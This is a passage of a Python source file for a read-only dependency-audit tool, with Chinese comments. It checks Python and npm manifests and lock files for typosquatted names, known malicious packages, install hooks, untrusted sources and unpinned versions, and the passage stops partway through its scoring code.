#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""检查依赖清单和锁文件，看有没有山寨包、可疑来源、安装钩子。

只读清单，不装任何包。只用标准库。
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

APP_NAME = "dep-audit"
APP_VER = "1.0.0"
HERE = Path(__file__).resolve().parent
DEFAULT_TARGET = HERE.parent / "review-lab"
DEFAULT_OUT = HERE / "reports"

SEV_W = {"critical": 40, "high": 18, "medium": 8, "low": 3, "info": 0}
CAT_CAP = 45
SEV_ORDER = ["critical", "high", "medium", "low", "info"]
SEV_LABEL = {"critical": "致命", "high": "高", "medium": "中", "low": "低", "info": "提示"}

CATS = {
    "squat":     "山寨名 / 抢注",
    "source":    "来源可信度",
    "version":   "版本锁定",
    "hook":      "安装钩子",
    "hygiene":   "清单卫生",
    "online":    "在线核验",
    "meta":      "元信息",
}

# 下面是公开事实，--blocklist 可以自己再加

# 常装的包，拿来比对名字像不像
TOP_PYPI = set("""
requests urllib3 certifi charset-normalizer idna numpy pandas scipy matplotlib seaborn
scikit-learn torch torchvision tensorflow keras transformers datasets tokenizers accelerate
openai anthropic langchain langchain-core langchain-community chromadb sentence-transformers
faiss-cpu pydantic pydantic-core fastapi starlette uvicorn gunicorn sqlalchemy alembic
pymysql psycopg2-binary asyncpg aiomysql aiosqlite redis celery httpx aiohttp beautifulsoup4
lxml scrapy selenium playwright pytest pytest-asyncio black flake8 ruff mypy isort tqdm rich
click typer jinja2 flask django djangorestframework pillow opencv-python boto3 botocore pyyaml
python-dotenv cryptography pyjwt passlib bcrypt streamlit gradio ipython jupyter notebook poetry
setuptools wheel pip virtualenv python-dateutil pytz six attrs packaging pyparsing protobuf
grpcio pyarrow polars duckdb huggingface-hub safetensors einops wandb mlflow ujson orjson
loguru structlog tenacity arrow markdown pygments sphinx numpy-financial sympy networkx
""".split())

# 高频 npm 包名
TOP_NPM = set("""
react react-dom vue angular svelte next nuxt vite webpack rollup esbuild typescript eslint
prettier jest vitest mocha chai axios lodash moment dayjs express koa fastify socket.io
mongoose sequelize prisma dotenv cors body-parser mysql2 pg ioredis redis jsonwebtoken
bcryptjs passport cheerio puppeteer chalk commander yargs inquirer ora uuid nanoid ramda immer
zustand redux tailwindcss sass postcss autoprefixer three d3 echarts element-plus antd pinia
vue-router react-router-dom tslib core-js regenerator-runtime
""".split())

# 公开事件里的恶意包，只是示例，正式用建议自建
BLOCKLIST = {
    "pypi": {"python3-dateutil", "jeilyfish", "colourama", "reqeusts", "python-sqlite",
             "setup-tools", "crypt", "urllib", "djanga", "openvc-python"},
    "npm": {"event-stream", "flatmap-stream", "crossenv", "cross-env.js", "d3.js", "fabric-js",
            "ffmpeg.js", "gruntcli", "mongose", "mssql-node", "mssql.js", "node-opencv",
            "node-opensl", "node-openssl", "node-tkinter", "opn", "opn.js", "peerlibrary",
            "shadow-js"},
}

# l/I/1、o/0 这种肉眼分不清的
HOMO = {"1": "l", "0": "o", "5": "s", "3": "e", "rn": "m", "vv": "w", "|": "l"}

SKIP_DIRS = {".selftest", "_verify", "_test", ".pytest_tmp", ".git", ".svn", ".hg", "node_modules", "__pycache__", ".venv", "venv",
             "env", ".mypy_cache", ".pytest_cache", ".idea", ".vscode", "dist", "build",
             "site-packages", ".tox"}
MAX_FILES = 3000


# ---------- 字符串距离 ----------

def _dl(a: str, b: str) -> int:
    """带相邻换位的编辑距离，短字符串够用。"""
    la, lb = len(a), len(b)
    if abs(la - lb) > 2:
        return 3
    prev2 = None
    prev = list(range(lb + 1))
    for i in range(1, la + 1):
        cur = [i] + [0] * lb
        for j in range(1, lb + 1):
            cost = 0 if a[i - 1] == b[j - 1] else 1
            cur[j] = min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + cost)
            if i > 1 and j > 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:
                cur[j] = min(cur[j], prev2[j - 2] + 1)
        prev2, prev = prev, cur
    return prev[lb]


def norm(name: str) -> str:
    return name.lower().replace("_", "-").replace(".", "-")


def _flat(name: str) -> str:
    return norm(name).replace("-", "")


def _homo(name: str) -> str:
    s = name.lower()
    for k, v in HOMO.items():
        s = s.replace(k, v)
    return s


FLAT_PYPI = {_flat(x): x for x in TOP_PYPI}
FLAT_NPM = {_flat(x): x for x in TOP_NPM}
HOMO_PYPI = {}
for _t in TOP_PYPI:
    HOMO_PYPI.setdefault(_homo(norm(_t)), _t)
HOMO_NPM = {}
for _t in TOP_NPM:
    HOMO_NPM.setdefault(_homo(norm(_t)), _t)


def squat_check(name: str, kind: str):
    """返回 (命中类型, 像谁, 严重度) 或 None"""
    universe = TOP_PYPI if kind == "pypi" else TOP_NPM
    flat_map = FLAT_PYPI if kind == "pypi" else FLAT_NPM
    homo_map = HOMO_PYPI if kind == "pypi" else HOMO_NPM
    n = norm(name)
    if n in {norm(x) for x in universe}:
        return None
    f = _flat(n)
    if f in flat_map:
        return "分隔符伪装", flat_map[f], "high"
    h = _homo(n)
    if h in homo_map and homo_map[h] != n:
        return "形近字伪装", homo_map[h], "high"
    best, best_d = None, 4
    for t in universe:
        if abs(len(t) - len(n)) > 1:
            continue
        d = _dl(n, t)
        if d < best_d:
            best, best_d = t, d
    if best_d == 1:
        return "差一个字符", best, "medium"
    return None


# ---------- 数据结构 ----------

class Finding:
    __slots__ = ("rule", "sev", "cat", "title", "why", "file", "line", "detail")

    def __init__(self, rid, sev, cat, title, why, file, line=0, detail=""):
        self.rule, self.sev, self.cat = rid, sev, cat
        self.title, self.why = title, why
        self.file, self.line, self.detail = file, line, detail

    def as_dict(self):
        return {"rule": self.rule, "severity": self.sev, "category": self.cat,
                "title": self.title, "why": self.why,
                "file": self.file, "line": self.line, "detail": self.detail}


class Dep:
    __slots__ = ("name", "spec", "kind", "source", "file", "line")

    def __init__(self, name, spec, kind, source, file, line):
        self.name, self.spec, self.kind = name, spec, kind
        self.source, self.file, self.line = source, file, line

    def as_dict(self):
        return {"name": self.name, "spec": self.spec, "kind": self.kind,
                "source": self.source, "file": self.file, "line": self.line}


# ---------- 清单解析 ----------

SPEC_RX = re.compile(
    r"^(?P<name>[A-Za-z0-9][A-Za-z0-9._-]*)\s*"
    r"(?:\[(?P<extras>[^\]]*)\])?\s*"
    r"(?P<op>===|==|>=|<=|~=|!=|>|<)?\s*"
    r"(?P<ver>[^\s;#]+)?\s*$")

DIRECT_URL_RX = re.compile(r"^(?P<name>[A-Za-z0-9][A-Za-z0-9._-]*)\s*@\s*(?P<url>\S+)")


def parse_pep508(text: str):
    """'pkg[extra]>=1.0 ; python_version<"3.9"' -> (name, spec) 或 None"""
    s = text.strip()
    if not s:
        return None
    m = DIRECT_URL_RX.match(s)
    if m:
        return m.group("name"), "@ " + m.group("url")
    s = s.split(";", 1)[0].strip()
    s = re.sub(r"--hash[=\s]\S+", "", s).strip()
    m = SPEC_RX.match(s)
    if not m:
        return None
    op = m.group("op") or ""
    ver = m.group("ver") or ""
    return m.group("name"), (op + ver).strip()


def _read(path: Path) -> str:
    for enc in ("utf-8-sig", "utf-8", "gb18030"):
        try:
            return path.read_text(encoding=enc)
        except UnicodeDecodeError:
            continue
    return path.read_text(encoding="latin-1", errors="replace")


def parse_requirements(path: Path, deps, findings, depth=0):
    if depth > 5:
        return
    text = _read(path)
    rel = path.name
    # 续行合并，保留起始行号
    merged, buf, start = [], "", 1
    for i, raw in enumerate(text.splitlines(), 1):
        s = raw.rstrip()
        if not buf:
            start = i
        if s.endswith("\\"):
            buf += s[:-1].strip() + " "
            continue
        merged.append((start, buf + s))
        buf = ""
    if buf:
        merged.append((start, buf))

    for lineno, raw in merged:
        line = re.sub(r"\s+#.*$", "", raw).strip()
        if not line or line.startswith("#"):
            continue
        low = line.lower()
        if low.startswith(("-r ", "--requirement")):
            target = line.split(None, 1)[1].strip() if " " in line else ""
            sub = (path.parent / target)
            if target and sub.is_file():
                parse_requirements(sub, deps, findings, depth + 1)
            else:
                findings.append(Finding("missing_include", "low", "hygiene", "引用的清单文件不存在", "路径可能写错了。",
                                        rel, lineno, target))
            continue
        if low.startswith(("-c ", "--constraint")):
            continue
        if low.startswith(("--index-url", "--extra-index-url", "-i ")):
            url = line.split(None, 1)[1] if " " in line else ""
            official = "pypi.org/simple" in url or "pypi.python.org" in url
            findings.append(Finding(
                "custom_index", "info" if official else "high", "source",
                f"指定了依赖源{'' if official else '（非官方 PyPI）'}",
                "非官方源能让你装到别人上传的同名包。", rel, lineno, url))
            continue
        if low.startswith(("--trusted-host", "--find-links", "-f ")):
            findings.append(Finding("trusted_host", "medium", "source", "放宽了源的可信限制", "可能把 HTTPS 校验也关了。",
                                    rel, lineno, line))
            continue
        if low.startswith(("-e ", "--editable")) or "git+" in low or "://" in low:
            findings.append(Finding("vcs_dep", "high", "source", "依赖直接来自 git 或网址", "内容随时变，锁不住，也不走审计。",
                                    rel, lineno, line))
            m = DIRECT_URL_RX.match(line.lstrip("-e ").strip())
            deps.append(Dep(m.group("name") if m else "(direct-url)",
                            "@ " + (m.group("url") if m else line),
                            "pypi", "url", rel, lineno))
            continue
        parsed = parse_pep508(line)
        if parsed:
            deps.append(Dep(parsed[0], parsed[1], "pypi", "index", rel, lineno))


def parse_pyproject(path: Path, deps, findings):
    rel = path.name
    data = None
    try:
        import tomllib
        data = tomllib.loads(_read(path))
    except Exception as e:
        findings.append(Finding("manifest_broken", "low", "hygiene", "清单解析失败", "文件格式不对，可能被人改过。",
                                rel, 0, f"{type(e).__name__}"))
        text = _read(path)
        for m in re.finditer(r"[\"']([A-Za-z0-9][A-Za-z0-9._-]*)\s*([<>=!~][^\"']*)?[\"']", text):
            deps.append(Dep(m.group(1), (m.group(2) or "").strip(), "pypi", "index", rel, 0))
        return

    project = data.get("project") or {}
    for item in project.get("dependencies") or []:
        parsed = parse_pep508(str(item))
        if parsed:
            deps.append(Dep(parsed[0], parsed[1], "pypi", "index", rel, 0))
    for group, items in (project.get("optional-dependencies") or {}).items():
        for item in items or []:
            parsed = parse_pep508(str(item))
            if parsed:
                deps.append(Dep(parsed[0], parsed[1], "pypi", f"extra:{group}", rel, 0))
    for req in (data.get("build-system") or {}).get("requires") or []:
        parsed = parse_pep508(str(req))
        if parsed:
            deps.append(Dep(parsed[0], parsed[1], "pypi", "build", rel, 0))

    poetry = ((data.get("tool") or {}).get("poetry") or {})
    for section in ("dependencies", "dev-dependencies"):
        for name, spec in (poetry.get(section) or {}).items():
            if name.lower() == "python":
                continue
            deps.append(Dep(name, str(spec), "pypi", f"poetry:{section}", rel, 0))


def parse_pipfile(path: Path, deps, findings):
    rel = path.name
    try:
        import tomllib
        data = tomllib.loads(_read(path))
    except Exception:
        return
    for section, tag in (("packages", "pipfile"), ("dev-packages", "pipfile:dev")):
        for name, spec in (data.get(section) or {}).items():
            deps.append(Dep(name, str(spec), "pypi", tag, rel, 0))


NPM_HOOKS = {"preinstall": "critical", "install": "critical",
             "postinstall": "critical", "prepare": "high", "prepublish": "high"}


def parse_package_json(path: Path, deps, findings):
    rel = path.name
    try:
        data = json.loads(_read(path))
    except Exception as e:
        findings.append(Finding("manifest_broken", "medium", "hygiene", "清单解析失败", "文件格式不对，可能被人改过。",
                                rel, 0, f"{type(e).__name__}"))
        return

    for key in ("dependencies", "devDependencies", "peerDependencies",
                "optionalDependencies", "bundleDependencies"):
        block = data.get(key)
        if isinstance(block, list):
            continue
        for name, spec in (block or {}).items():
            src = "registry"
            s = str(spec)
            if s.startswith(("file:", "link:", "./", "../")):
                src = "local"
            elif s.startswith(("git", "github:", "http", "https")):
                src = "url"
            deps.append(Dep(name, s, "npm", src, rel, 0))

    scripts = data.get("scripts") or {}
    for hook, sev in NPM_HOOKS.items():
        if hook in scripts:
            findings.append(Finding(
                f"npm_{hook}", sev, "hook",
                f"package.json 带 {hook} 钩子",
                "这条命令在你 npm install 时就会执行，不需要你手动运行 ， "
                "是 npm 供应链投毒最常用的入口。",
                rel, 0, str(scripts[hook])[:160]))

    for name, s in (data.get("dependencies") or {}).items():
        t = str(s).strip()
        if t in ("", "*", "latest", "x"):
            findings.append(Finding("unpinned_npm", "medium", "version", "依赖没写版本", "每次装都可能装到不一样的东西。",
                                    rel, 0, f"{name}: {t!r}"))


MANIFEST_FILES = {"requirements.txt", "constraints.txt", "pyproject.toml",
                  "package.json", "Pipfile"}
LOCK_FILES = {"package-lock.json", "npm-shrinkwrap.json", "yarn.lock", "pnpm-lock.yaml",
              "poetry.lock", "uv.lock", "pipfile.lock", "requirements.lock"}


def collect_manifests(root: Path):
    found = []
    for dirpath, dirnames, filenames in os.walk(root, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for name in filenames:
            low = name.lower()
            if low in MANIFEST_FILES or re.fullmatch(r"requirements[\w.-]*\.txt", low) \
                    or low == "requirements.in":
                found.append(Path(dirpath) / name)
            if len(found) >= MAX_FILES:
                return found
    return found


def collect_locks(root: Path):
    hits = []
    for dirpath, dirnames, filenames in os.walk(root, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for name in filenames:
            if name.lower() in LOCK_FILES:
                hits.append(Path(dirpath) / name)
        if len(hits) > 20:
            break
    return hits


# ---------- 传递依赖（锁文件） ----------

MAX_TREE = 4000
OFFICIAL_HOSTS = {"registry.npmjs.org", "registry.yarnpkg.com", "pypi.org", "files.pythonhosted.org"}
MIRROR_HOSTS = ("npmmirror.com", "taobao.org", "tencent", "huaweicloud", "aliyun", "cnpmjs.org",
                "pypi.tuna.tsinghua.edu.cn", "mirrors.aliyun.com", "doubanio.com")


def _host_of(url: str) -> str:
    try:
        return (urllib.parse.urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def _note_host(state, findings, fname, url, name, via):
    host = _host_of(url)
    if not host or host in OFFICIAL_HOSTS:
        return
    mirror = any(m in host for m in MIRROR_HOSTS)
    rule = "lock_mirror" if mirror else "lock_host"
    if state.get(rule, 0) >= 5:
        return
    state[rule] = state.get(rule, 0) + 1
    if mirror:
        findings.append(Finding("lock_mirror", "low", "source", f"传递依赖走的是镜像源：{name}", "镜像本身一般没问题，只是多了一个可信环节。",
                                fname, 0, f"{host}  ← {via}"))
    else:
        findings.append(Finding("lock_host", "high", "source", f"传递依赖指向不明来源：{name}", "锁文件里记着下载地址，不是官方仓库说明包被换过。",
                                fname, 0, f"{host}  ← {via}"))


def _tree_add(tree, state, findings, kind, name, version, via, fname,
              resolved=None, has_hook=False, has_hash=True):
    if len(tree) >= MAX_TREE:
        return
    tree.append({"kind": kind, "name": name, "version": version,
                 "via": via, "file": fname})
    if resolved:
        _note_host(state, findings, fname, resolved, name, via)
    if has_hook and state.get("tree_hook", 0) < 8:
        state["tree_hook"] = state.get("tree_hook", 0) + 1
        findings.append(Finding("tree_hook", "critical", "hook", f"传递依赖带安装钩子：{name}", "不是你写的脚本，但装的时候会以你的身份跑。",
                                fname, 0, f"{name}@{version}  ← {via}"))
    if not has_hash and state.get("no_integrity", 0) < 5:
        state["no_integrity"] = state.get("no_integrity", 0) + 1
        findings.append(Finding("no_integrity", "low", "hygiene", f"传递依赖没有完整性校验：{name}", "锁文件缺哈希，装了也验不出文件被改过。",
                                fname, 0, via))


def _parse_package_lock(path: Path, tree, state, findings):
    data = json.loads(_read(path))
    fname = path.name
    pk = data.get("packages")
    if isinstance(pk, dict):
        for key, meta in pk.items():
            if not key or not isinstance(meta, dict):
                continue
            if meta.get("link"):
                continue
            name = meta.get("name") or key.split("node_modules/")[-1]
            via = key.replace("node_modules/", "").replace("/node_modules/", " > ")
            _tree_add(tree, state, findings, "npm", name, meta.get("version"), via, fname,
                      resolved=meta.get("resolved"),
                      has_hook=bool(meta.get("hasInstallScript")),
                      has_hash=bool(meta.get("integrity")))
        return

    deps = data.get("dependencies") or {}

    def walk(block, prefix, depth):
        if depth > 12:
            return
        for name, meta in (block or {}).items():
            if not isinstance(meta, dict):
                continue
            via = (prefix + " > " + name) if prefix else name
            _tree_add(tree, state, findings, "npm", name, meta.get("version"), via, fname,
                      resolved=meta.get("resolved"),
                      has_hook=bool(meta.get("hasInstallScript")),
                      has_hash=bool(meta.get("integrity")))
            walk(meta.get("dependencies"), via, depth + 1)

    walk(deps, "", 0)


def _parse_yarn_lock(path: Path, tree, state, findings):
    fname = path.name
    text = _read(path)
    for block in re.split(r"\n(?=\S)", text):
        lines = block.splitlines()
        if not lines or lines[0].startswith("#"):
            continue
        header = lines[0].rstrip(":").strip().strip('"')
        spec = header.split(",")[0].strip().strip('"')
        name = spec.rsplit("@", 1)[0] if "@" in spec[1:] else spec
        version, resolved, integrity = None, None, None
        for ln in lines[1:]:
            s = ln.strip()
            if s.startswith("version"):
                version = s.split(None, 1)[-1].strip('"')
            elif s.startswith("resolved"):
                resolved = s.split(None, 1)[-1].strip('"')
            elif s.startswith("integrity"):
                integrity = s.split(None, 1)[-1].strip('"')
        _tree_add(tree, state, findings, "npm", name, version, "yarn.lock", fname,
                  resolved=resolved, has_hash=bool(integrity))


def _parse_pnpm_lock(path: Path, tree, state, findings):
    """YAML 没标准库解析器，只能按行硬凑。"""
    fname = path.name
    text = _read(path)
    seen = set()
    pats = [re.compile(r"^\s{2,6}'?/?((?:@[^/\s]+/)?[A-Za-z0-9][^/\s']*)@(\d+\.\d+\.\d+[^':]*)'?:"),
            re.compile(r"^\s{2,6}'?/?((?:@[^/\s]+/)?[A-Za-z0-9][^/\s']*)/(\d+\.\d+\.\d+[^\s':]*)'?:")]
    for line in text.splitlines():
        for pat in pats:
            m = pat.match(line)
            if m:
                name, ver = m.group(1), m.group(2)
                key = (name, ver)
                if key in seen:
                    break
                seen.add(key)
                _tree_add(tree, state, findings, "npm", name, ver, "pnpm-lock", fname)
                break


def _parse_poetry_lock(path: Path, tree, state, findings):
    import tomllib
    data = tomllib.loads(_read(path))
    fname = path.name
    for pkg in data.get("package") or []:
        name = pkg.get("name")
        if not name:
            continue
        src = pkg.get("source") or {}
        stype = (src.get("type") or "").lower()
        has_hash = bool(pkg.get("files"))
        via = "poetry.lock"
        if stype in ("git", "url", "file", "path", "directory"):
            if state.get("lock_source", 0) < 5:
                state["lock_source"] = state.get("lock_source", 0) + 1
                findings.append(Finding("lock_source", "high", "source", "传递依赖不是从 PyPI 来的", "git 或本地路径，不受版本号约束。",
                                        fname, 0, f"{stype} {src.get('url') or src.get('path') or ''}"))
        _tree_add(tree, state, findings, "pypi", name, pkg.get("version"), via, fname,
                  resolved=src.get("url") if stype == "legacy" else None,
                  has_hash=has_hash)


def _parse_uv_lock(path: Path, tree, state, findings):
    import tomllib
    data = tomllib.loads(_read(path))
    fname = path.name
    for pkg in data.get("package") or []:
        name = pkg.get("name")
        if not name:
            continue
        src = pkg.get("source") or {}
        if "registry" in src:
            url = src.get("registry") or ""
        elif "git" in src:
            url = src.get("git") or ""
            if state.get("lock_source", 0) < 5:
                state["lock_source"] = state.get("lock_source", 0) + 1
                findings.append(Finding("lock_source", "high", "source", "传递依赖不是从 PyPI 来的", "git 或本地路径，不受版本号约束。",
                                        fname, 0, str(url)[:120]))
        else:
            url = ""
        _tree_add(tree, state, findings, "pypi", name, pkg.get("version"), "uv.lock", fname,
                  resolved=url or None, has_hash=bool(pkg.get("sdist") or pkg.get("wheels")))


def _parse_pipfile_lock(path: Path, tree, state, findings):
    data = json.loads(_read(path))
    fname = path.name
    for section in ("default", "develop"):
        for name, meta in (data.get(section) or {}).items():
            if not isinstance(meta, dict):
                continue
            ver = str(meta.get("version") or "").lstrip("=")
            _tree_add(tree, state, findings, "pypi", name, ver, f"Pipfile.lock:{section}",
                      fname, has_hash=bool(meta.get("hashes")))


LOCK_PARSERS = {
    "package-lock.json": _parse_package_lock,
    "npm-shrinkwrap.json": _parse_package_lock,
    "yarn.lock": _parse_yarn_lock,
    "pnpm-lock.yaml": _parse_pnpm_lock,
    "poetry.lock": _parse_poetry_lock,
    "uv.lock": _parse_uv_lock,
    "pipfile.lock": _parse_pipfile_lock,
}


def parse_locks(lock_paths, findings):
    tree, state = [], {}
    for p in lock_paths:
        fn = LOCK_PARSERS.get(p.name.lower())
        if not fn:
            continue
        try:
            fn(p, tree, state, findings)
        except Exception as e:
            findings.append(Finding("lock_broken", "low", "hygiene", f"{p.name} 解析失败", "这个锁文件被跳过，里面的传递依赖没审查。",
                                    p.name, 0, f"{type(e).__name__}: {e}"))
        if len(tree) >= MAX_TREE:
            break
    return tree


def check_tree(tree, findings, direct_keys):
    """对传递依赖跑名单检查，返回查了多少条。"""
    checked, seen = 0, set()
    for d in tree:
        key = (d["kind"], norm(d["name"]))
        if key in seen or key in direct_keys:
            continue
        seen.add(key)
        checked += 1
        low = norm(d["name"])

        if low in {norm(x) for x in BLOCKLIST.get(d["kind"], set())}:
            findings.append(Finding("tree_blocklist", "critical", "squat", f"传递依赖里出现已知恶意包：{d['name']}", "不是你写的，是被别的包拖进来的。",
                                    d["file"], 0, f"{d['name']}@{d['version']}  ← {d['via']}"))
            continue

        n = d["name"]
        if n.startswith("@") or len(n) < 5:
            continue
        if len(seen) <= 400:
            hit = squat_check(n, d["kind"])
            if hit:
                how, looks_like, _sev = hit
                findings.append(Finding("tree_squat", "medium", "squat", f"传递依赖名字像 {looks_like}，{how}", "可能是巧合，也可能被人顺手塞进来。",
                                        d["file"], 0, f"{n}@{d['version']}  ← {d['via']}"))
    return checked


# ---------- 离线启发式 ----------

def check_deps(deps, findings):
    for d in deps:
        n = d.name
        low = norm(n)

        # 1. 已知恶意 / 抢注名单（命中即定论，但也继续看名字像谁，方便解释）
        if low in {norm(x) for x in BLOCKLIST.get(d.kind, set())}:
            findings.append(Finding(
                "blocklist", "critical", "squat", "命中已知恶意包", "这个包名在公开事件里被当过投毒载体，别装。",
                d.file, d.line, f"{n} {d.spec}"))

        # 2. 山寨名
        hit = squat_check(n, d.kind)
        if hit:
            how, looks_like, sev = hit
            findings.append(Finding(
                "typosquat", sev, "squat", f"名字像 {looks_like}，{how}", "typosquatting：注册个差一两个字符的名字，等你打错。",
                d.file, d.line, f"{n} ≈ {looks_like}"))

        # 3. 来源
        if d.source in ("url", "local"):
            findings.append(Finding(
                "non_registry", "high", "source", "依赖来自 git 或本地路径", "内容随时可变，也不走任何审核。",
                d.file, d.line, f"{n}: {d.spec}"))

        # 4. 版本锁定
        spec = (d.spec or "").strip()
        if not spec:
            findings.append(Finding("unpinned", "medium" if d.kind == "npm" else "low",
                                    "version", "依赖没写版本", "装到哪个版本看运气，没法复现。",
                                    d.file, d.line, n))
        elif spec.startswith((">=", "^", "~", "*", ">")) and d.kind == "pypi":
            findings.append(Finding("loose", "low", "version", "版本约束太宽", "上游发坏版本你会自动吃到。",
                                    d.file, d.line, f"{n}{spec}"))
        elif "==" not in spec and d.kind == "pypi" and not spec.startswith(("<", "!")):
            findings.append(Finding("loose", "low", "version", "版本约束太宽", "上游发坏版本你会自动吃到。", d.file, d.line, f"{n}{spec}"))


def check_hygiene(manifests, locks, deps, findings, root: Path):
    if deps and not locks:
        findings.append(Finding(
            "no_lock", "medium", "hygiene", "没有 lock 文件", "锁文件记着每个依赖的确切版本和哈希，缺了就没法复现。",
            root.name or ".", 0, "未见 package-lock.json / poetry.lock / uv.lock 等"))

    names = [norm(d.name) for d in deps if d.kind == "pypi"]
    dupes = {n for n in names if names.count(n) > 1}
    for n in list(dupes)[:5]:
        findings.append(Finding("dupe", "low", "hygiene", "同一依赖重复声明", "不同清单里版本可能打架。", root.name or ".", 0, n))

    if len({norm(d.name) for d in deps}) > 60:
        findings.append(Finding("too_many", "info", "meta", "依赖数量偏多", "依赖越多，攻击面越大。",
                                root.name or ".", 0, f"{len(deps)} 条声明"))


# ---------- 在线核验 ----------

def fetch_json(url: str, timeout: float):
    req = urllib.request.Request(url, headers={"User-Agent": f"{APP_NAME}/{APP_VER}"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(4 * 1024 * 1024)
        return json.loads(raw), None
    except urllib.error.HTTPError as e:
        return None, e.code
    except Exception as e:
        return None, type(e).__name__


def _age_days(ts: str):
    try:
        t = datetime.fromisoformat(ts.replace("Z", "+00:00"))
        return (datetime.now(t.tzinfo) - t).days
    except Exception:
        return None


def exact_version(spec: str, kind: str):
    s = (spec or "").strip()
    if kind == "pypi":
        m = re.match(r"^===?\s*([0-9][^\s,]*)$", s)
        return m.group(1) if m else None
    m = re.match(r"^v?(\d+\.\d+\.\d+[\w.\-+]*)$", s)
    return m.group(1) if m else None


def _pkg_age_days(releases: dict):
    """整个包第一版距今多少天，判断是不是新包。"""
    earliest = None
    for files in (releases or {}).values():
        for f in files or []:
            ts = f.get("upload_time_iso_8601") or f.get("upload_time")
            if not ts:
                continue
            try:
                t = datetime.fromisoformat(ts.replace("Z", "+00:00"))
            except Exception:
                continue
            if earliest is None or t < earliest:
                earliest = t
            break
    if earliest is None:
        return None
    return (datetime.now(earliest.tzinfo) - earliest).days


def online_check(deps, findings, timeout: float, limit: int):
    uniq = {}
    for d in deps:
        if d.source not in ("index", "registry"):
            continue
        uniq.setdefault((d.kind, norm(d.name)), d)

    rows = []
    for i, ((kind, _k), d) in enumerate(list(uniq.items())[:limit]):
        if i:
            time.sleep(0.2)
        exact = exact_version(d.spec, kind)

        if kind == "pypi":
            data, err = fetch_json(
                "https://pypi.org/pypi/" + urllib.parse.quote(d.name) + "/json", timeout)
            if err == 404:
                findings.append(Finding("pypi_missing", "high", "online", f"PyPI 上没有这个包：{d.name}", "拼错了，或者已经下架了。",
                                        d.file, d.line, d.name))
                rows.append({"name": d.name, "registry": "pypi", "status": "不存在"})
                continue
            if err:
                rows.append({"name": d.name, "registry": "pypi", "status": f"未取到({err})"})
                continue

            info = (data or {}).get("info") or {}
            releases = (data or {}).get("releases") or {}
            pkg_age = _pkg_age_days(releases)

            # 整个包很新 ， 这才是新包的真实信号
            if pkg_age is not None and pkg_age <= 30:
                findings.append(Finding(
                    "new_pkg", "high", "online", f"这个包上线才 {pkg_age} 天：{d.name}", "没有历史可查的新包，抢注投毒的重灾区。",
                    d.file, d.line, f"首版 {pkg_age} 天前"))
            elif pkg_age is not None and pkg_age <= 120:
                findings.append(Finding(
                    "young_pkg", "low", "online", f"这个包上线 {pkg_age} 天：{d.name}", "用得人还少，出问题没人报。", d.file, d.line, ""))

            ver_age, yanked = None, False
            if exact:
                files = releases.get(exact)
                if files is None:
                    findings.append(Finding(
                        "ver_missing", "high", "online", f"PyPI 上没有 {d.name}=={exact} 这个版本", "版本号写错，或者该版本被撤回了。",
                        d.file, d.line, d.spec))
                else:
                    yanked = any(f.get("yanked") for f in files)
                    ts = (files[0].get("upload_time_iso_8601") if files else None)
                    ver_age = _age_days(ts) if ts else None
                    if yanked:
                        findings.append(Finding(
                            "ver_yanked", "high", "online", f"{d.name}=={exact} 已被作者撤回", "撤回通常意味着这个版本有严重问题。", d.file, d.line, ""))
            else:
                ts = None
                for files in releases.values():
                    for f in files or []:
                        t = f.get("upload_time_iso_8601")
                        if t and (ts is None or t > ts):
                            ts = t
                ver_age = _age_days(ts) if ts else None

            rows.append({"name": d.name, "registry": "pypi",
                         "version": exact or info.get("version"),
                         "pkg_age_days": pkg_age, "ver_age_days": ver_age,
                         "yanked": yanked, "status": "ok"})

        else:
            target = exact or "latest"
            data, err = fetch_json(
                "https://registry.npmjs.org/"
                + urllib.parse.quote(d.name, safe="@") + "/" + urllib.parse.quote(target),
                timeout)
            if err == 404:
                if exact:
                    findings.append(Finding(
                        "npm_ver_missing", "high", "online", f"npm 上没有 {d.name}@{exact}", "版本号写错，或者被撤下了。",
                        d.file, d.line, d.spec))
                    rows.append({"name": d.name, "registry": "npm", "status": "版本不存在"})
                else:
                    findings.append(Finding("npm_missing", "high", "online", f"npm 上没有这个包：{d.name}", "拼错了，或者已经下架了。",
                                            d.file, d.line, d.name))
                    rows.append({"name": d.name, "registry": "npm", "status": "不存在"})
                continue
            if err:
                rows.append({"name": d.name, "registry": "npm", "status": f"未取到({err})"})
                continue

            scripts = (data or {}).get("scripts") or {}
            bad_hooks = [h for h in ("preinstall", "install", "postinstall") if h in scripts]
            if bad_hooks:
                findings.append(Finding(
                    "remote_hook", "critical", "hook",
                    f"{'指定版本' if exact else 'latest 版'}带安装钩子：{d.name}",
                    "你没写这行，是上游作者写的，但 npm install 时会以你的身份执行。",
                    d.file, d.line, str(scripts[bad_hooks[0]])[:160]))
            if (data or {}).get("deprecated"):
                findings.append(Finding("npm_deprecated", "high", "online", f"包已被标记废弃：{d.name}", "作者可能不维护了，也可能被判定有问题。",
                                        d.file, d.line, str(data.get("deprecated"))[:120]))
            rows.append({"name": d.name, "registry": "npm",
                         "version": (data or {}).get("version"),
                         "hooks": bad_hooks, "status": "ok"})
    return rows


# ---------- 评分 / 报告 ----------

def grade_of(deduction: int, has_critical: bool):
    if has_critical:
        return "D", "极高"
    if deduction <= 4:
        return "A", "低"
    if deduction <= 19:
        return "B", "中"
    if deduction <= 39:
        return "C", "高"
    return "D", "极高"


ADVICE = {
    "A": "清单干净：名字正常、来源正式、版本基本锁定。可以装。",
    "B": "有个别卫生问题（未锁版本之类），不致命。装之前把版本改精确。",
    "C": "有需要人工确认的项。先看扣分明细，逐个查证再装。",
    "D": "不要直接 npm install / pip install。里面有致命项（山寨名、钩子、可疑来源）。",
}


# 这几类每多一条都更可疑，按条数计分（最多算 5 条）；其余规则每类只计一次
COUNTED_RULES = {"unpinned", "unpinned_npm", "loose", "non_registry", "typosquat",
                 "vcs_dep", "trusted_host", "custom_index"}


def compute_deduction(findings):
    agg = {}
    for f in findings:
        if f.rule not in agg:
            agg[f.rule] = [f.sev, f.cat, 0]
